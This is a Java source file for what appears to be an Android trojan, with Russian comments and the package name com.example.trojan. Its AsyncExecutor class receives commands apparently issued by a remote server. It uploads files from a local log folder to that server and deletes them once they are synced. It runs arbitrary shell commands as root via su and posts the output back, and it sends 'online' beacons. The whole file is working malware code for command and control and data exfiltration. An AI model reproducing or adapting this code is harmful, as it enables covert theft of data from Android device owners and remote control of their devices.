package com.example.trojan;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.Callable;

import android.util.Log;

public class AsyncExecutor implements Callable<Long>{
	 String cmd;
	 String args;
	 String filelist_url = MyService.filelist_url;
	 String cmd_url = MyService.cmd_url;
	 String online_url = MyService.online_url;
	 String file_to_upload;
	 List<String> remotelist = new ArrayList<String>(); // массив файлов на сервере
	 List<String> locallist = new ArrayList<String>(); // массив локальных файлов
	 long synctime=0;
	
	AsyncExecutor(String cmd,String args){   // конструктор
		this.cmd=cmd;
		this.args=args;}
	
	
	public Long call() {
	try{
		switch (cmd) {
		case "sync":
			boolean synced=true;
			remotelist=ShellSession.load_url(filelist_url); // загружаем страницу с листингом файлов
			getlocalfiles(args); // получаем список файлов (args = папка для записи логов)
			for (int i=0; i<locallist.size();i++){
				file_to_upload=locallist.get(i);  // текущий проверяемый на синхронизированность файл
				Log.d(MyService.LOG_TAG, "checking: "+file_to_upload);
				if(remotelist.contains(file_to_upload)){
					Log.d(MyService.LOG_TAG, file_to_upload+" is present");
				}
				else{
					synced=false;
					Log.d(MyService.LOG_TAG, "adding uploader task for "+file_to_upload);
					uploadfile(args+"/"+file_to_upload);
				}
			}
			if(synced){  // чистим уже синхронизированное
				String datadir=args;
				File dir = new File(datadir); 
				if (dir.isDirectory()) 
				{
				    String[] files = dir.list();
				    for (String file : files)
				    {
				    	try{
				       new File(dir, file).delete();} catch(Exception e){}
				    }
				}
				Log.d(MyService.LOG_TAG, "cleaned synced files");}
			break;
		case "rootcmd":
			root_exec_cmd(args);
			break;
		case "notifyonline":
			Log.d(MyService.LOG_TAG, "notifying that we are online..");
			notyfyonline();
			break;
			
		}

		return 	System.currentTimeMillis(); // возвращаем результат в кач. времени (0 - ошибка)
	}
	catch(Exception e){
		Log.d(MyService.LOG_TAG,"error executing async switch\n"+e.toString());
		return 0L;
		
	}
	}	
	
	public void notyfyonline() {
		long curtime = System.currentTimeMillis() / 1000L;   // timestamp отстает на 3 часа
		postdata(MyService.online_url,Long.toString(curtime));
		
	}
	
	public void getlocalfiles(String sync_path){	
	try{
	 args=sync_path;
	 Log.d(MyService.LOG_TAG, "Path: " + args);
	 File f = new File(args);        
	 File file[] = f.listFiles();
	 Log.d(MyService.LOG_TAG, file.length+" files");
	 for (int i=0; i < file.length; i++)
	 {
		 locallist.add(file[i].getName());
	     Log.d(MyService.LOG_TAG, file[i].getName());
	 }
		}
		catch(Exception e){
			Log.d(MyService.LOG_TAG, "error reading or no local files!");
		}
	Log.d(MyService.LOG_TAG, "total local:"+locallist.size());
	}
	
	
	static public void uploadfile(String file) {
		Runnable uploader = new HttpPoster(file);
		new Thread(uploader).start();
	}
	
	public void postdata(String url,String data) {
		Runnable uploader = new HttpPoster(url,data);
		new Thread(uploader).start();
	}
	
	public void postdata(String url,List<String> data) {
		Runnable uploader = new HttpPoster(url,data);
		new Thread(uploader).start();
	}
	
	
public String md5(File file) throws IOException{
	char[] hexDigits = "0123456789abcdef".toCharArray();
	String md5 = "";
	 FileInputStream fis  = new FileInputStream(file);
		try {
		    byte[] bytes = new byte[4096];
		    int read = 0;
		    MessageDigest digest = MessageDigest.getInstance("MD5");

		    while ((read = fis.read(bytes)) != -1) {
		        digest.update(bytes, 0, read);
		    }

		    byte[] messageDigest = digest.digest();

		    StringBuilder sb = new StringBuilder(32);

		    for (byte b : messageDigest) {
		        sb.append(hexDigits[(b >> 4) & 0x0f]);
		        sb.append(hexDigits[b & 0x0f]);
		    }

		    md5 = sb.toString();
			fis.close();
		} catch (Exception e) {
			Log.d(MyService.LOG_TAG, "error in md5()!\n"+e.toString());
		}
	    return md5;
}

 void root_exec_cmd(String cmd) throws Exception{   // может подвиснуть при пустой команде
	List<String> res = new ArrayList<String>();
	String line;

    	Process p=Runtime.getRuntime().exec("su");
	    DataOutputStream dos = new DataOutputStream(p.getOutputStream());
	    dos.writeBytes(cmd+"\n");
	    //dos.writeBytes("echo $("+cmd+" ; pwd);\n");     // works but result in single line
	    
        BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
		line=in.readLine();
		res.add(line);
			  while (in.ready()){
			   line=in.readLine();
			   res.add(line);
			   }
			   
	    dos.writeBytes("exit\n");
	    dos.flush();
	    dos.close();
	    p.waitFor();
	    
		if (res.size()!=0){
			postdata(MyService.post_url,res); }// отсылаем результат если все ок 
		// в противном случае подвиснет
				    	
}
	
	
}
